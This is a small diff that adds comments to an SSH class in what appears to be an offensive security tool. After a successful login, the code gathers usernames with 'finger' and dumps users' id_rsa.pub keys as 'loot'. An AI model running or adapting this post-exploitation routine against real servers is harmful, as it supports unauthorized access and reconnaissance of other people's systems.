@@ -7,6 +7,7 @@ class SSH(Exploit):
         self.name = 'ssh'
         self.port = 22
     
+    # gathering all users currently on the ssh server using finger
     def get_usernames(self, ssh):
         ssh.invoke_shell()
         stdin, stdout, stderr = ssh.exec_command('finger')
@@ -21,6 +22,7 @@ class SSH(Exploit):
                 usernames.append(loot)
         return usernames
     
+    # dump id_rsa.pub into local Data folder
     def get_sshkeys(self, ssh, ip_address, username):
         try:
             stdin, stdout, stderr = ssh.exec_command('cat ~/.ssh/id_rsa.pub')
@@ -51,6 +53,7 @@ class SSH(Exploit):
                 print(f'{Color.BRED}Authentification failed.{Color.END}', file=self.output)
                 ssh.close()
             else:
+                # if successful, collect loot
                 print(f'{Color.BGRN}Success.{Color.END}{Color.BMAGEN}Now gathering all usernames.{Color.END}', file=self.output)
                 users.extend(self.get_usernames(ssh))
                 
